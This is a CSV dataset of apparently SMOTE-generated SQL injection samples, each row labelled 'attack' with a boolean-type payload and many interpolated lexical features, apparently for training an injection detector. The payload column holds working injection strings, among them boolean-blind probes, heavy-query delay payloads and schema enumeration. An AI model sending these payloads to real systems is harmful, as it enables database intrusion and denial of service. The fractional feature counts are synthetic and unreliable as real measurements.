id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000450,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.6835132338118433,390.83423612851436,31.0,3.2825886403892,101.50812515662906,48.823402586342254,185.0,55.50270838554302,0.2597137557545084,0.12493108605954256,0.47334688383648005,0.14200827434946894,3.3369445140573624,0.0,0.1657638714856593,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.165763871485659,0.8342361285143407,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.8342361285143407,0.16576387148565935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000451,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,2.184334776629737,156.19109876458182,37.74946684969158,3.977926952276821,48.81316643788553,23.562633287577103,58.62633287577105,25.188966163348155,0.3134864034351188,0.15171969022133525,0.37538773644718343,0.1594061698963625,3.5626332875771047,0.0,0.8747334248457901,0.43736671242289504,0.0,2.0,0.0,10.687899862731316,0.0,1.12526657515421,1.0,8.250533150308419,1.0,0.0,0.437366712422895,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.562633287577105,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000452,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,4.032875064499571,304.78317932805646,31.917200219914292,3.4655410192242693,81.44579483201412,37.82799780085707,138.68138889432822,46.82799780085707,0.26912978353505224,0.12607483289930405,0.4459266360348214,0.15886874753082222,4.0,0.0,0.0,0.0,0.0,2.5413998900428534,0.0,28.82799780085707,0.917200219914293,0.45860010995714645,1.917200219914293,10.706999450214267,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.4586001099571465,1.082799780085707,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5413998900428535,0.0,0.0,0.0,0.0,8.789799230299973,0.0,0.0,0.0,0.0,0.0,0.0,0.5413998900428535,0.5413998900428535,13.49679868051424
SMOTE_000453,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,0.8587688580301783,37.10106831727518,13.163442124131787,2.6468343251620574,3.408605310329463,8.427952565538742,19.264510441406948,6.0,0.09670935364590086,0.22354052888401144,0.516598470202691,0.16315164726739667,0.9182789379341064,0.08172106206589369,0.0,0.1634421241317873,0.08172106206589375,0.9182789379341063,0.0,2.9182789379341063,0.9182789379341063,0.0,-2.220446049250313e-16,1.1634421241317874,0.9182789379341063,0.08172106206589388,0.0,0.0,0.08172106206589372,0.9182789379341063,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9182789379341063,0.0817210620658938,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000454,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.49106222615407313,252.26555427931947,36.86978829901521,3.802814107459632,75.47915319606085,35.69788299015213,99.21872979409127,41.86978829901521,0.2992961612161427,0.14122900375656064,0.39340071509236346,0.16607411993493315,0.0,0.0,2.0,0.0,0.0,1.8697882990152133,0.0,22.0,0.0,2.0,4.0,13.869788299015212,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.8697882990152132,0.0,0.13021170098478685,0.8697882990152133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.869788299015212
SMOTE_000455,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,1.0771845725959694,250.25001317228396,32.619403378277134,3.8184989358759354,55.046640709737886,72.2444099644191,94.3861998295877,28.572762668539248,0.2337302383163183,0.2777000259389806,0.37429095522601974,0.1142787805186814,0.0,0.0,2.0,0.0,1.904850844569283,1.904850844569283,0.0,16.858210134831396,0.0,0.0,5.619403378277132,5.809701689138566,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.904850844569283,0.0,3.714552533707849,0.0,0.9048508445692831,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.904850844569283,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.524254222846416
SMOTE_000456,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.2184561924412771,195.30147643101606,33.54989454064171,3.7315087729301193,55.45010545935829,25.35031637807487,79.60084367486631,34.90021091871658,0.2841892440929141,0.12969412153965035,0.40737214913317465,0.1787444852342609,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.900210918716578,2.0,1.0,3.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.450105459358289,0.5498945406417108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000457,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.7147240647272308,53.96740109007679,18.86277540877879,3.5461531614342365,8.448825317939061,20.827900181679464,17.655800363358928,7.034875227099327,0.15298312355283097,0.39173024520569144,0.32699351421955797,0.12829311702191962,0.0,0.20697504541986575,3.0,0.0,0.0,2.0,0.0,1.4139500908397302,0.0,0.20697504541986578,0.20697504541986578,5.0,0.0,0.20697504541986578,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000458,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,5.446481498919115,211.0904620791611,34.97750620650815,3.9971347956354135,64.87628413579482,47.854277247496654,74.7867958670211,23.573104828848518,0.3416176006025735,0.2019427350396567,0.3455715720534832,0.11086809230428664,0.0,0.49437655162703714,2.0,0.0,1.5056234483729627,2.0,0.0,12.067481380475552,0.0,0.0,4.022493793491851,5.505623448372963,0.0,0.4943765516270372,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5056234483729628,0.0,2.5168703451188885,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5056234483729628,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.022493793491852
SMOTE_000459,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,1.4069182823819784,141.244977510024,38.0401799198079,4.04812088040768,51.63448273055229,21.28515742983191,50.060269879711846,18.265067469927963,0.36535776143975474,0.15076279666745318,0.35453572295515423,0.1293437189376379,2.2650674699279616,0.24497751002401275,2.0,0.7550224899759872,0.2449775100240129,2.0,0.0,8.020089959903949,0.0,0.0,1.2449775100240128,5.755022489975987,0.7550224899759872,0.2449775100240129,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.24497751002401283,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.244977510024013
SMOTE_000460,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1943280877433593,145.0241133965278,29.0,3.8424934533496518,73.98913678341805,8.781664068123307,45.689984408739846,16.563328136246618,0.5082123250041009,0.0610103882440826,0.3159197376637569,0.11485754908805967,0.7816640681233087,0.0,1.6091679659383455,0.0,1.0,1.1954160170308272,0.0,6.3908320340616545,0.39083203406165434,0.0,2.7816640681233085,3.8045839829691728,0.19541601703082717,0.0,0.8045839829691729,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.19541601703082723,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1954160170308272
SMOTE_000461,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.6953399576787034,363.9983840471998,31.992706468852948,3.382104323946813,98.83063283081762,43.42625671212939,168.12399002949988,53.61750447475292,0.2749706020760053,0.11891823202672082,0.4570661356281278,0.14904503026914603,4.0,0.0,0.0,0.0,0.0,2.8014587062294103,0.0,34.82333929967056,0.0,0.39708258754117964,1.5956238813117696,12.801458706229411,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.19854129377058982,1.6029174124588204,0.0,0.0,0.0,1.8014587062294103,0.19854129377058988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8014587062294103,0.0,0.0,0.0,0.0,11.00729353114705,0.0,0.0,0.0,0.0,0.0,0.0,0.8014587062294103,0.8014587062294103,17.0145870622941
SMOTE_000462,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,1.1461995841876296,100.6032922547395,30.07537311241652,3.628875748597972,29.282879688117447,13.528226497730282,42.03753287850461,15.754653190387161,0.291518994458335,0.12931162657550122,0.4169620110833299,0.1622073678828338,2.660359961014681,0.11321334632843982,1.7735733073431204,1.11321334632844,0.11321334632843993,0.8867866536715601,0.0,8.207506575700922,0.0,0.0,0.8867866536715601,3.8867866536715603,0.8867866536715602,0.11321334632843992,0.8867866536715601,0.0,0.11321334632843982,0.8867866536715602,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8867866536715602,0.11321334632843999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000463,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000018,0.1546198476197841,353.2763282082876,40.88837410689703,3.790424469828159,117.95071660483211,34.82139857103525,147.77211517586733,52.732097856552876,0.333676318718597,0.09869569773358403,0.4181635947802498,0.14946438876756918,3.9106992855176257,0.0,0.044650357241187155,0.0,0.0,1.0,0.0,31.776748213794065,0.0,2.0,4.0,11.044650357241188,0.9776748213794064,0.0,0.022325178620593578,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9776748213794064,0.0,0.0,0.9776748213794066,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9776748213794064,0.9776748213794064,11.910699285517627
SMOTE_000464,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,2.2630327690474297,75.60307186315256,25.74601306602774,3.707087808199765,20.74282351884993,16.250797386794453,28.488836584877667,10.120614372630511,0.26816732024010087,0.24438704704133904,0.36132739150934307,0.126118241209217,1.1238039198083216,0.625398693397226,2.0,0.3746013066027739,0.0,1.625398693397226,0.0,3.9968104528221904,0.0,0.0,0.374601306602774,4.0,0.3746013066027739,0.6253986933972261,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.625398693397226,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6253986933972264
SMOTE_000465,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.250662895832296,244.94647509632972,36.0,3.7778574637217046,77.21260718872843,28.042521437745684,97.12756431323706,42.56378215661853,0.31492548810502285,0.11451977859613857,0.3967300383818079,0.17382469491703062,2.085042875491371,0.0,0.9574785622543145,0.0,0.0,1.5212607188728429,0.0,22.0,0.0,2.0,4.0,12.478739281127158,0.5212607188728428,0.0,0.47873928112715725,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.5212607188728429,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.521260718872844
SMOTE_000466,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.2238829028985565,84.36499938486506,25.235208171006057,3.2972623958597476,21.674791418903986,12.863749948738755,36.74291644453461,13.083541572687718,0.21544188415400867,0.17213815875317873,0.4566820184677066,0.15573793862510596,2.287916649579585,0.0,1.287916649579585,0.6439583247897925,0.0,1.0,0.0,6.863749948738755,0.35604167521020746,0.0,0.6439583247897924,2.9318749743693773,1.0,0.0,0.6439583247897925,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000467,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1277889812997053,137.32083566475302,31.295402942000834,4.0090816177705415,68.15617904525115,10.295402942000832,43.295402942000834,15.573850735500207,0.4973159051431877,0.0732774160631971,0.31561930709759756,0.11378737169601763,0.0,0.286925367750104,2.0,0.0,1.0,1.2869253677501042,0.0,6.0,0.0,0.0,2.0,4.286925367750104,0.0,0.2869253677501042,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2869253677501042,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2869253677501042
SMOTE_000468,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,1.6134687747741363,237.87007658653954,34.82327197838115,3.7093589295445524,70.35826682975157,28.82327197838115,98.81408482434685,39.87445295405995,0.2891736851385586,0.12509869020555164,0.41487481023513995,0.1708528144207498,4.0,0.0,0.0,0.0,0.0,1.772091002702356,0.0,21.190725962167015,1.544182005404712,1.2279089972976438,3.227908997297644,8.683726991892932,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.2279089972976439,0.0,0.0,0.22790899729764394,1.7720910027023558,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.455817994595288,0.0,0.0,0.0,0.0,0.0,0.0,0.22790899729764394,0.22790899729764394,8.13954498648822
SMOTE_000469,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,0.1671600357571018,257.81919407341286,36.13956406304024,3.796271604497214,83.03277406649777,29.167476875648287,101.36772781779435,44.25121531347243,0.32192314907399294,0.11329532909408835,0.39289327149368003,0.17188825033823865,4.0,0.0,0.0,0.0,0.0,1.972087187391952,0.0,22.27912812608048,0.0,2.0,4.0,11.972087187391953,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.02791281260804801,0.0,0.0,0.027912812608047843,1.0,0.972087187391952,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.027912812608047816,0.027912812608047816,9.083738437824143
SMOTE_000470,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,0.827100888492178,262.533042287035,37.505908122879816,3.772657182245852,79.6914663823979,29.75886218431972,106.19737450527771,46.88533921503967,0.3018786381478327,0.11417014640101525,0.40374804863398145,0.18020316681717058,4.0,0.0,0.0,0.0,0.0,1.8735229692800468,0.0,23.264770307199534,1.7470459385600934,2.0,4.0,11.873522969280046,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.12647703071995342,0.0,0.0,0.1264770307199533,1.0,0.8735229692800467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12647703071995328,0.12647703071995328,9.37943109215986
SMOTE_000471,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.918217072330354,143.84737987970914,33.09582893233356,4.06693810031955,70.63176478195865,12.09582893233356,45.09582893233356,16.023957233083387,0.49217044277752775,0.0821108278497378,0.31388575003448893,0.11183297933824551,0.0,0.511978616541695,2.0,0.0,1.0,1.5119786165416949,0.0,6.0,0.0,0.0,2.0,4.511978616541695,0.0,0.511978616541695,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.511978616541695,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.511978616541695
SMOTE_000472,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,4.116148029815059,327.26550825993934,33.78819963289158,3.535885106573752,85.63540110132524,48.241301284879455,145.50050520070255,47.88830067303209,0.2675198456820769,0.14703577699373058,0.4361596581215205,0.149284719202672,0.0,0.0,1.4646999388152642,0.0,0.0,2.535300061184736,0.0,30.564800978955773,0.0,0.9293998776305281,2.394099816445792,14.0,0.0,0.0,0.46469993881526406,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.464699938815264,1.070600122369472,0.0,0.46469993881526395,0.0,0.535300061184736,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5353000611847359,0.0,0.0,0.0,0.0,9.67650030592368,0.0,0.0,0.0,0.0,0.0,0.0,0.5353000611847359,0.5353000611847359,14.35300061184736
SMOTE_000473,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.6333593057609074,35.68474617508454,15.224632823344605,3.0278882874451005,3.4492656466892058,10.235480528395334,16.000000000000007,6.0,0.09437022416697455,0.28081850083414195,0.454408199999188,0.1704030749996955,0.887683588327697,0.0,2.112316411672303,0.0,0.0,1.1123164116723032,0.0,1.8876835883276968,0.0,0.0,-2.220446049250313e-16,3.224632823344606,0.8876835883276969,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11231641167230308,0.0,0.8876835883276969,0.11231641167230316,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1123164116723032
SMOTE_000474,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,0.918306759713887,152.73261389589143,35.35394184246607,4.1784047034446195,73.69551857945251,16.0,46.366306947945716,16.670788368493213,0.4826267284482861,0.10502220438873851,0.3030833667711153,0.10926770039186012,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.670788368493214,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6707883684932147,0.32921163150678545,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000475,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.043888335917946,289.47066673107474,37.7064686500532,3.794627890585634,94.62786801039371,31.047762380063844,116.7233927705214,47.07164357009577,0.3259034112216597,0.108465852299131,0.40116103198254555,0.16446970449666373,4.0,0.0,0.0,0.0,0.0,1.658706269989359,0.0,25.41293730010641,0.0,2.0,4.0,11.65870626998936,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.341293730010641,0.0,0.0,0.341293730010641,1.0,0.658706269989359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.341293730010641,0.341293730010641,10.023881190031924
